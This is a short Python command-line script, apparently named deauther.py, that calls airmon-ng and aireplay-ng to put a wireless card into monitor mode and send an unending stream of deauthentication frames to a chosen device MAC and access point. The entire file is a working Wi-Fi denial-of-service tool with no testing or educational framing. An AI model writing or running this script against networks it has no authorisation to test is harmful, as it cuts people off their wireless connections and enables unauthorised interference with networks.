import subprocess
import sys

def deauth(target_mac, gateway_mac, interface):
    print(f"Deauthenticating {target_mac} from {gateway_mac} using {interface}")
    subprocess.run(["sudo", "airmon-ng", "start", interface])
    subprocess.run(["sudo", "aireplay-ng", "--deauth", "0", "-a", gateway_mac, "-c", target_mac, interface])

if __name__ == "__main__":
    if len(sys.argv) != 4:
        print("Usage: python deauther.py <target_mac> <gateway_mac> <interface>")
        sys.exit(1)

    target_mac = sys.argv[1]
    gateway_mac = sys.argv[2]
    interface = sys.argv[3]

    deauth(target_mac, gateway_mac, interface)
